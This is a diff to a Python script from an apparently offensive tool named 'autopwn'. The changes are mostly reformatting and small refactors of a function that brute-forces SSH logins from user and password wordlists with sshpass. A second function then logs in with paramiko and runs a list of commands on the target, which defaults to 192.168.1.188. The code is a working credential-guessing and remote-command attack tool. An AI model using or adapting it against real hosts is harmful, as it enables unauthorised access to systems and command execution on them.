@@ -8,11 +8,12 @@ from autopwn import flushProcesses
 import sequences as s
 from logs import LOG
 
-LOGFILE = open("./run/LOGS","a+")
+LOGFILE = open("./run/LOGS", "a+")
+
 
 def processList(inp="") -> list:
     """Function that process lists txts in lists."""
-    LOG(f"Processing wordlist for input : {inp}",LOGFILE)
+    LOG(f"Processing wordlist for input : {inp}", LOGFILE)
     with open(inp, "r+") as f:
         tmp = f.readlines()
     lst = []
@@ -21,13 +22,15 @@ def processList(inp="") -> list:
     return lst
 
 
-def getSshCredsAndConn(ulist="", plist="", domain="") -> tuple[(str, str)]:
+def getSshCredsAndConn(
+    domain: str, ulist="./init/userlist", plist="./init/passlist"
+) -> tuple[(str, str)]:
     """Slow bruteforce of ssh credentials."""
     LOG(f"Bruteforcing user/password for {domain}", LOGFILE)
     uname = processList(ulist)
     passwd = processList(plist)
-    retUsr = "x"
-    retPass = "x"
+    retUsr = None
+    retPass = None
     for user in uname:
         for password in passwd:
             command = f"echo 'exit' | sshpass -p {password} ssh {user}@{domain}"
@@ -54,7 +57,7 @@ def autoSshPawn(usr, password, host, sequence) -> int:
         LOG(f"Connecting to {host} with SSH creds {usr}:{password}", LOGFILE)
         ssh.connect(host, username=usr, password=password)
     except paramiko.AuthenticationException:
-        LOG(f"Connection to SSH client failed.", LOGFILE,"err")
+        LOG(f"Connection to SSH client failed.", LOGFILE, "err")
         print(f"Can't connect to SSH client.")
         return -1
 
@@ -63,12 +66,10 @@ def autoSshPawn(usr, password, host, sequence) -> int:
         print(f"[Command] {instruction}")
         LOG(f" Launched {instruction} over SSH against {host}", LOGFILE)
         try:
-            stdin, stdout, stderr = ssh.exec_command(
-                instruction, timeout=10
-            )
+            stdin, stdout, stderr = ssh.exec_command(instruction, timeout=10)
             print(f"[Output] " + stdout.read().decode("utf8"))
         except TimeoutError:
-            LOG(f"Timeout error for {instruction}. ", LOGFILE,"crit")
+            LOG(f"Timeout error for {instruction}. ", LOGFILE, "crit")
             continue
 
     return 0
@@ -88,9 +89,7 @@ if __name__ == "__main__":
     else:
         target = "192.168.1.188"
 
-    usr, pwd = getSshCredsAndConn(
-        ulist="./init/userlist", plist="./init/passlist", domain=target
-    )
+    usr, pwd = getSshCredsAndConn(target)
 
     if usr and pwd:
         print(f"Credentials user = {usr} | password = {pwd}")
